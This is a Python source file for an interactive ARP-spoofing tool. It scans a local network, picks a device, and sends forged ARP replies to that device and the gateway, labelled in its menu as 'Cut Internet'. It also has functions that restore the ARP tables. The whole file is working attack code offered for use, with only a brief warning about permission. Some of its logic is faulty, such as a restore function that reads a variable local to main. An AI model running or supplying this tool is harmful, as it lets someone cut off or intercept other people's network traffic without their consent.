import psutil
import socket
import ipaddress
import sys
import time
import threading

# --- Configuration ---
SPOOF_INTERVAL_SECONDS = 2 # How often to send ARP packets

# --- Global Variables ---
spoofing_threads = {} # Dictionary to keep track of active spoofing threads {target_ip: thread_object}
stop_events = {} # Dictionary to signal threads to stop {target_ip: threading.Event()}
gateway_ip = None
gateway_mac = None
my_mac = None
selected_interface_name_global = None # Store selected interface name globally
# --- Scapy Import ---
try:
    # Adjust Scapy logging level to reduce noise
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("scapy.loading").setLevel(logging.ERROR)

    # Try importing core components separately
    print("DEBUG: Attempting to import scapy modules...", file=sys.stderr)
    from scapy.config import conf
    from scapy.arch import get_if_hwaddr # Uses Npcap/arch specific
    from scapy.layers.l2 import ARP, Ether # Layer 2
    from scapy.sendrecv import srp, sendp # Sending/Receiving
    # from scapy.supersocket import L3RawSocket # Socket interaction - Removed as potentially problematic/unneeded for L2 sending
    from scapy.error import Scapy_Exception
    from scapy.route import Route # For gateway detection

    print("DEBUG: Scapy modules imported successfully.", file=sys.stderr)
    scapy_imported = True
except ImportError as e:
    scapy_imported = False
    print(f"CRITICAL: Failed to import a specific Scapy component: {e}", file=sys.stderr)
    print("This usually means Scapy or a core dependency is missing or corrupted.", file=sys.stderr)
    print("Please try reinstalling Scapy: python -m pip install --upgrade --force-reinstall scapy", file=sys.stderr)
    sys.exit(1)
except (OSError, Scapy_Exception, Exception) as e:
    scapy_imported = False
    print(f"CRITICAL: Failed during Scapy initialization: {e}", file=sys.stderr)
    print("This often indicates an issue with Npcap/WinPcap drivers or permissions.", file=sys.stderr)
    print("- Ensure Npcap is installed (https://npcap.com/#download) with 'WinPcap API-compatible Mode'.", file=sys.stderr)
    print("- Ensure you are running this script as Administrator.", file=sys.stderr)
    sys.exit(1)


# --- Network Info Functions ---
def get_interfaces():
    """Retrieves and returns a dictionary of network interfaces with their IPv4 address and netmask."""
    # (Code is the same as before, including error handling)
    interface_details = {}
    try:
        interfaces = psutil.net_if_addrs()
        for name, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address and addr.netmask:
                    try:
                        ipaddress.ip_address(addr.address)
                        ipaddress.ip_address(addr.netmask)
                        interface_details[name] = {'ip': addr.address, 'netmask': addr.netmask}
                        break
                    except ValueError:
                        continue
    except Exception as e:
        print(f"Error retrieving interface details: {e}", file=sys.stderr)
    return interface_details

def get_gateway_ip():
    """Attempts to find the default gateway IP using Scapy's routing table."""
    if not scapy_imported: return None
    try:
        # Filter routes for the default route (0.0.0.0/0)
        default_route = next((r for r in conf.route.routes if r[0] == 0 and r[1] == 0), None)
        if default_route:
            return default_route[2] # Gateway IP is the third element
        else:
            print("Warning: Could not automatically determine default gateway IP.", file=sys.stderr)
            return None
    except Exception as e:
        print(f"Error getting gateway IP: {e}", file=sys.stderr)
        return None

def get_mac(target_ip, interface_name):
    """Gets the MAC address for a given IP on the network using ARP."""
    if not scapy_imported: return None
    try:
        # Ensure scapy uses the correct interface
        conf.iface = interface_name
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # Send and receive packets at layer 2
        answered_list = srp(arp_request_broadcast, timeout=1, iface=interface_name, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc # MAC is in the hardware source field of the reply
        else:
            print(f"Warning: No ARP reply received from {target_ip}. Cannot get MAC.", file=sys.stderr)
            return None
    except OSError as e:
        print(f"\nError sending ARP request (permissions? Npcap running?): {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"Error getting MAC for {target_ip}: {e}", file=sys.stderr)
        return None

def get_own_mac(interface_name):
    """Gets the MAC address of the specified local interface."""
    if not scapy_imported: return None
    try:
        return get_if_hwaddr(interface_name)
    except Scapy_Exception as e:
         print(f"Error getting MAC address for interface '{interface_name}': {e}", file=sys.stderr)
         print("Check if the interface name is correct and active.", file=sys.stderr)
         return None
    except Exception as e:
        print(f"Unexpected error getting own MAC: {e}", file=sys.stderr)
        return None

# --- User Interaction Functions ---
def choose_interface(interface_details):
    """Displays interfaces and prompts the user to choose one."""
    # (Code is the same as before)
    if not interface_details:
        print("No suitable network interfaces with IPv4 found.")
        return None, None

    print("\nAvailable Network Interfaces:")
    interface_list = list(interface_details.keys())
    for i, name in enumerate(interface_list):
        details = interface_details[name]
        print(f"  [{i}] {name}: IP={details['ip']}, Mask={details['netmask']}")

    while True:
        try:
            choice = int(input("\nSelect the interface number to use: "))
            if 0 <= choice < len(interface_list):
                selected_interface_name = interface_list[choice]
                selected_details = interface_details[selected_interface_name]
                print(f"\nYou selected: {selected_interface_name} (IP: {selected_details['ip']}, Mask: {selected_details['netmask']})")
                return selected_interface_name, selected_details
            else:
                print("Invalid choice. Please enter a number from the list.")
        except ValueError:
            print("Invalid input. Please enter a number.")
        except KeyboardInterrupt:
            print("\nSelection cancelled.")
            return None, None

# --- Network Scanning ---
def scan_network(network_cidr, interface_name):
    """Performs an ARP scan on the network to discover devices."""
    # (Code is the same as before, including error handling and Npcap check)
    if not scapy_imported:
        print("Scapy is not available. Cannot perform network scan.", file=sys.stderr)
        return []

    print(f"\nScanning network {network_cidr} on interface {interface_name}...")
    clients = []
    try:
        conf.iface = interface_name
        arp_request = ARP(pdst=network_cidr)
        broadcast_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast_frame / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, iface=interface_name, verbose=False)[0]

        # Add own IP/MAC to list for reference, prevent self-targeting?
        #clients.append({'ip': my_ip, 'mac': my_mac, 'is_self': True}) # Consider adding self later

        for sent, received in answered_list:
             # Avoid adding the gateway itself if we already know it? Maybe not necessary.
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})

        print(f"Scan complete. Found {len(clients)} device(s).")

    except OSError as e:
        if "Npcap" in str(e) or "WinPcap" in str(e):
             print(f"\nError: Scapy dependency Npcap/WinPcap might be missing or not running.", file=sys.stderr)
             print("Please install Npcap (recommended) from https://npcap.com/#download", file=sys.stderr)
             print("Make sure to check the 'WinPcap API-compatible Mode' during installation.", file=sys.stderr)
        elif "permitted" in str(e):
            print("\nError: Insufficient privileges. Please run this script as an administrator.", file=sys.stderr)
        else:
            print(f"\nError during scan (Network/Permissions related): {e}", file=sys.stderr)
    except Exception as e:
        print(f"\nAn unexpected error occurred during scanning: {e}", file=sys.stderr)

    return clients

# --- ARP Spoofing Core ---
def arp_spoof(target_ip, target_mac, spoof_ip, interface_name, stop_event):
    """Sends crafted ARP packets to one target."""
    global my_mac # Use the globally stored MAC address of our machine
    if not my_mac:
        print(f"DEBUG [{target_ip}]: Cannot spoof, own MAC address not determined.", file=sys.stderr)
        return
    if not target_mac:
        print(f"DEBUG [{target_ip}]: Cannot spoof, target MAC address not determined.", file=sys.stderr)
        return
    if not spoof_ip:
        print(f"DEBUG [{target_ip}]: Cannot spoof, IP to spoof (gateway/target) not determined.", file=sys.stderr)
        return

    # Packet telling the target: <spoof_ip> is at <my_mac>
    # Example: Telling 192.168.1.100 (target_ip) that 192.168.1.1 (spoof_ip) is at MY_MAC (hwsrc)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    # op=2 means ARP reply
    # pdst, hwdst = target's IP and MAC
    # psrc = the IP we want the target to associate with our MAC (the gateway's IP or the other target's IP)
    # hwsrc = our MAC address

    print(f"DEBUG [{target_ip}]: Spoof thread running. Target={target_ip}/{target_mac}, SpoofingIP={spoof_ip}, MyMAC={my_mac}", file=sys.stderr)

    while not stop_event.is_set():
        try:
            print(f"DEBUG [{target_ip}]: Sending packet: {packet.summary()}", file=sys.stderr)
            sendp(Ether() / packet, iface=interface_name, verbose=False)
            # sendp sends at Layer 2 (Ethernet frames)
            time.sleep(SPOOF_INTERVAL_SECONDS)
        except Scapy_Exception as e:
            print(f"\nError sending spoof packet to {target_ip}: {e}. Stopping spoof.", file=sys.stderr)
            break # Stop thread on send error
        except Exception as e:
             print(f"\nUnexpected error in spoof thread for {target_ip}: {e}. Stopping spoof.", file=sys.stderr)
             break # Stop thread on unexpected error

    print(f"Stopped ARP spoofing for {target_ip}")

def restore_arp(target_ip, target_mac, source_ip, source_mac, interface_name):
    """Sends correct ARP packets to restore the target's ARP table."""
    if not target_mac or not source_mac:
        print(f"Warning: Cannot restore ARP for {target_ip}, MAC address missing.", file=sys.stderr)
        return

    print(f"Sending ARP restoration packets to {target_ip}...")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    try:
        # Send packet multiple times for higher chance of success
        sendp(Ether() / packet, count=4, iface=interface_name, verbose=False)
        print(f"ARP table restoration attempted for {target_ip}.")
    except Scapy_Exception as e:
        print(f"\nError sending restore packet to {target_ip}: {e}", file=sys.stderr)
    except Exception as e:
        print(f"\nUnexpected error restoring ARP for {target_ip}: {e}", file=sys.stderr)

# --- Thread Management ---
def start_spoofing_thread(target_ip, target_mac, gateway_ip, gateway_mac, interface_name):
    """Starts ARP spoofing threads for a target and the gateway."""
    global stop_events, spoofing_threads

    if target_ip in spoofing_threads:
        print(f"Already spoofing {target_ip}.")
        return

    if not gateway_ip or not gateway_mac or not my_mac or not target_mac:
        print(f"Error: Missing required IP/MAC address to start spoofing {target_ip}.", file=sys.stderr)
        return

    stop_event = threading.Event()
    stop_events[target_ip] = stop_event

    # Thread 1: Tell target that GatewayIP is at MyMAC
    print(f"DEBUG [Start]: Initiating spoof thread: Target={target_ip}, SpoofedIP={gateway_ip}", file=sys.stderr)
    thread1 = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, gateway_ip, interface_name, stop_event), daemon=True)
    # Thread 2: Tell gateway that TargetIP is at MyMAC
    print(f"DEBUG [Start]: Initiating spoof thread: Target={gateway_ip}, SpoofedIP={target_ip}", file=sys.stderr)
    thread2 = threading.Thread(target=arp_spoof, args=(gateway_ip, gateway_mac, target_ip, interface_name, stop_event), daemon=True)

    spoofing_threads[target_ip] = {'target_thread': thread1, 'gateway_thread': thread2, 'target_mac': target_mac}

    thread1.start()
    thread2.start()
    print(f"Started ARP spoofing against {target_ip} ({target_mac})")

def stop_spoofing(target_ip):
    """Stops ARP spoofing for a target and sends restoration packets."""
    global selected_interface_name_global # Used for restoration
    if target_ip in spoofing_threads:
        # 1. Signal the thread to stop
        if target_ip in stop_events:
            print(f"DEBUG: Setting stop event for {target_ip}")
            stop_events[target_ip].set()
        else:
            print(f"Warning: No stop event found for {target_ip}", file=sys.stderr)

        # 2. Wait for the thread to finish
        thread = spoofing_threads[target_ip]
        print(f"DEBUG: Waiting for spoof thread {target_ip} to join...")
        thread['target_thread'].join(timeout=SPOOF_INTERVAL_SECONDS * 2) # Wait a bit longer than interval
        if thread['target_thread'].is_alive():
            print(f"Warning: Spoofing thread for {target_ip} did not terminate gracefully.", file=sys.stderr)

        # 3. Perform ARP restoration
        if gateway_ip and gateway_mac and my_mac:
             # Get target MAC again in case it changed or wasn't stored properly
             target_mac = None
             for device in discovered_devices: # Use the latest scanned devices list
                 if device['ip'] == target_ip:
                     target_mac = device['mac']
                     break

             if target_mac:
                 print(f"DEBUG: Attempting ARP restore for {target_ip} ({target_mac}) with gateway {gateway_ip} ({gateway_mac})")
                 # Restore target's view of gateway
                 restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, selected_interface_name_global)
                 # Restore gateway's view of target
                 restore_arp(gateway_ip, gateway_mac, target_ip, target_mac, selected_interface_name_global)
             else:
                 print(f"Warning: Could not find MAC for {target_ip} in discovered devices list during restore.", file=sys.stderr)
        else:
             print("Warning: Missing gateway or own MAC info, cannot perform ARP restoration.", file=sys.stderr)

        # 4. Clean up tracking dictionaries
        if target_ip in stop_events: del stop_events[target_ip]
        if target_ip in spoofing_threads: del spoofing_threads[target_ip]
        print(f"ARP spoofing stopped and restoration attempted for {target_ip}.")
    else:
         print(f"Not currently spoofing {target_ip}.")

def stop_spoofing_thread(target_ip):
    """Stops ARP spoofing for a target and sends restoration packets."""
    stop_spoofing(target_ip)

# --- Main Execution Block ---
def print_menu():
    print("\n--- Options ---")
    print("1. Scan Network")
    print("2. List Discovered Devices")
    print("3. Cut Internet (ARP Spoof)")
    print("4. Restore Internet (Stop Spoofing)")
    print("5. List Actively Spoofed Devices")
    print("0. Exit")
    print("---------------")

def main():
    global gateway_ip, gateway_mac, my_mac, selected_interface_name_global # Allow modification

    print("--- Network Device Discovery and ARP Spoofing Tool ---")
    print("🚨 WARNING: Use responsibly and only on networks you own or have permission for. 🚨")
    print("🚨 Requires Administrator privileges and Npcap (with WinPcap compatibility). 🚨")

    if not scapy_imported:
        print("\nScapy is not available. Cannot continue.", file=sys.stderr)
        sys.exit(1)

    # 1. Select Interface
    interfaces = get_interfaces()
    selected_interface_name, selected_interface_details = choose_interface(interfaces)
    if not selected_interface_name or not selected_interface_details:
        print("\nNo interface selected or error retrieving details. Exiting.")
        sys.exit(1)

    selected_interface_name_global = selected_interface_name # Store globally for restore function
    my_ip = selected_interface_details.get('ip')
    my_netmask = selected_interface_details.get('netmask')

    # 2. Get Own MAC
    print(f"\nGetting MAC address for {selected_interface_name}...")
    my_mac = get_own_mac(selected_interface_name)
    if not my_mac:
        print("Error: Could not determine MAC address for the selected interface. Exiting.", file=sys.stderr)
        sys.exit(1)
    print(f"Your MAC address ({selected_interface_name}): {my_mac}")

    # 3. Calculate Network Range
    network_cidr = None
    try:
        if my_ip and my_netmask:
            host_ip = ipaddress.ip_interface(f"{my_ip}/{my_netmask}")
            network_cidr = str(host_ip.network)
            print(f"Network range: {network_cidr}")
        else:
            print("Error: Missing IP/Netmask for network calculation.", file=sys.stderr)
            sys.exit(1)
    except ValueError as e:
        print(f"Error calculating network range: {e}", file=sys.stderr)
        sys.exit(1)
    if not network_cidr:
        print("Error: Failed to determine network range. Exiting.", file=sys.stderr)
        sys.exit(1)

    # --- Perform Initial Scan --- 
    print("\nPerforming initial network scan to find devices (including gateway)...")
    discovered_devices = scan_network(network_cidr, selected_interface_name)
    if discovered_devices:
        print("Initial scan found:")
        for i, device in enumerate(discovered_devices):
             print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']}")
        print("------------------")
    else:
        print("Warning: Initial network scan failed or found no devices.", file=sys.stderr)
        # Allow continuing but warn that gateway detection might fail
        discovered_devices = [] # Ensure it's an empty list

    # 4. Get Gateway Info (with fallback and prompt)
    print("\nAttempting to determine Gateway IP...")
    gateway_ip_auto = get_gateway_ip()

    if gateway_ip_auto:
        print(f"Automatic Gateway IP detected: {gateway_ip_auto}")
        gateway_ip = gateway_ip_auto # Use the automatically detected IP
    else:
        print("Could not automatically detect Gateway IP.")
        while not gateway_ip:
            try:
                user_input_ip = input("Please enter the Gateway (Router) IP address: ").strip()
                # Basic validation
                ipaddress.ip_address(user_input_ip)
                gateway_ip = user_input_ip
            except ValueError:
                print("Invalid IP address format. Please try again.")
            except KeyboardInterrupt:
                print("\nExiting.")
                sys.exit(0)

    print(f"Using Gateway IP: {gateway_ip}")
    print(f"Attempting to get MAC address for Gateway {gateway_ip}...")
    gateway_mac = get_mac(gateway_ip, selected_interface_name) # Try direct ARP first

    if not gateway_mac:
        print(f"Warning: Direct ARP request for Gateway {gateway_ip} MAC failed.", file=sys.stderr)
        print("Checking initial scan results for the gateway's MAC...")
        # Fallback: Check if gateway was found in the initial scan
        found_in_scan = False
        for device in discovered_devices:
            if device['ip'] == gateway_ip:
                gateway_mac = device['mac']
                print(f"Found Gateway MAC in scan results: {gateway_mac}")
                found_in_scan = True
                break
        if not found_in_scan:
             print(f"Error: Could not determine MAC address for Gateway {gateway_ip} via ARP or scan.", file=sys.stderr)
             print("ARP Spoofing will likely fail. You can try scanning again later.", file=sys.stderr)
             # Continue execution, but warn the user
    else:
        print(f"Successfully obtained Gateway MAC via ARP: {gateway_mac}")

    # 5. Main Interaction Loop
    # discovered_devices = [] # Removed, now populated earlier
    while True:
        print_menu()
        try:
            choice = input("Enter your choice: ")

            if choice == '1':
                if network_cidr:
                    discovered_devices = scan_network(network_cidr, selected_interface_name)
                    if discovered_devices:
                        print("\n--- Discovered Devices ---")
                        for i, device in enumerate(discovered_devices):
                             # Don't list gateway or self? Maybe filter later during selection.
                            print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']}")
                        print("--------------------------")
                    else:
                        print("No devices found (or scan failed).")
                else:
                    print("Error: Network range not determined. Cannot scan.", file=sys.stderr)

            elif choice == '2':
                if discovered_devices:
                    print("\n--- Previously Discovered Devices ---")
                    for i, device in enumerate(discovered_devices):
                        print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']}")
                    print("-----------------------------------")
                else:
                    print("No devices discovered yet. Run Scan (1) first.")

            elif choice == '3': # Cut Internet
                if not discovered_devices:
                    print("Please scan the network (1) first to select a target.")
                    continue
                # Ensure gateway IP/MAC are available before allowing spoofing
                if not gateway_ip or not gateway_mac:
                    print("Error: Gateway IP or MAC could not be determined earlier. Cannot initiate spoofing.", file=sys.stderr)
                    print("Try scanning again (1) or restart the script.", file=sys.stderr)
                    continue

                print("\n--- Select Device to Cut ---")
                for i, device in enumerate(discovered_devices):
                    # Prevent targeting self or gateway directly?
                    is_gateway = device['ip'] == gateway_ip
                    is_self = device['ip'] == my_ip
                    status = ""
                    if is_gateway: status = " (Gateway)"
                    if is_self: status = " (Your PC)"
                    if device['ip'] in spoofing_threads: status += " (Spoofing Active)"
                    print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']}{status}")
                print("----------------------------")

                try:
                    target_index = int(input("Enter the number of the device to target: "))
                    if 0 <= target_index < len(discovered_devices):
                        target = discovered_devices[target_index]
                        target_ip = target['ip']
                        target_mac = target['mac']

                        if target_ip == gateway_ip:
                            print("Targeting the gateway is generally not recommended.")
                            # Add confirmation? continue?
                        if target_ip == my_ip:
                            print("Cannot target your own machine.")
                            continue

                        if target_ip in spoofing_threads:
                            print(f"{target_ip} is already being spoofed.")
                        else:
                            start_spoofing_thread(target_ip, target_mac, gateway_ip, gateway_mac, selected_interface_name)
                    else:
                        print("Invalid selection index.")
                except ValueError:
                    print("Invalid input. Please enter a number.")

            elif choice == '4': # Restore Internet
                if not spoofing_threads:
                    print("No devices are currently being spoofed.")
                    continue

                print("\n--- Select Device to Restore ---")
                spoofed_list = list(spoofing_threads.keys())
                for i, target_ip in enumerate(spoofed_list):
                    print(f"  [{i}] IP: {target_ip}")
                print("------------------------------")

                try:
                    restore_index = int(input("Enter the number of the device to restore (or 'all'): "))
                    if 0 <= restore_index < len(spoofed_list):
                         target_ip_to_restore = spoofed_list[restore_index]
                         stop_spoofing(target_ip_to_restore)
                    else:
                         print("Invalid selection index.")
                except ValueError:
                    # Check for 'all' keyword
                    restore_input = input("Enter the number of the device to restore (or 'all'): ").strip().lower()
                    if restore_input == 'all':
                         print("\nStopping spoofing for all targets...")
                         # Create a copy of keys to avoid modification during iteration
                         all_targets = list(spoofing_threads.keys())
                         for target_ip in all_targets:
                             stop_spoofing(target_ip)
                         print("Attempted restoration for all targets.")
                    else:
                        try:
                            index = int(restore_input)
                            if 0 <= index < len(discovered_devices):
                                target_ip_to_restore = discovered_devices[index]['ip']
                                stop_spoofing(target_ip_to_restore)
                            else:
                                print("Invalid selection index.")
                        except ValueError:
                            print("Invalid input. Please enter a number or 'all'.")

            elif choice == '5': # List Spoofed Devices
                 if spoofing_threads:
                     print("\n--- Actively Spoofed Devices ---")
                     for ip in spoofing_threads.keys():
                         print(f"  - {ip}")
                     print("------------------------------")
                 else:
                    print("No devices are currently being spoofed.")

            elif choice == '0':
                print("\nExiting...")
                # Stop all active spoofing before exiting
                if spoofing_threads:
                    print("Stopping all active spoofing threads...")
                    all_targets = list(spoofing_threads.keys())
                    for target_ip_to_stop in all_targets:
                        stop_spoofing(target_ip_to_stop)
                    print("Cleanup complete.")
                break # Exit the while loop

            else:
                print("Invalid choice. Please try again.")

        except KeyboardInterrupt:
            print("\nCtrl+C detected. Exiting...")
            # Ensure cleanup on Ctrl+C
            if spoofing_threads:
                print("Stopping all active spoofing threads...")
                all_targets = list(spoofing_threads.keys())
                for target_ip_to_stop in all_targets:
                    stop_spoofing(target_ip_to_stop)
                print("Cleanup complete.")
            break


if __name__ == "__main__":
    main()
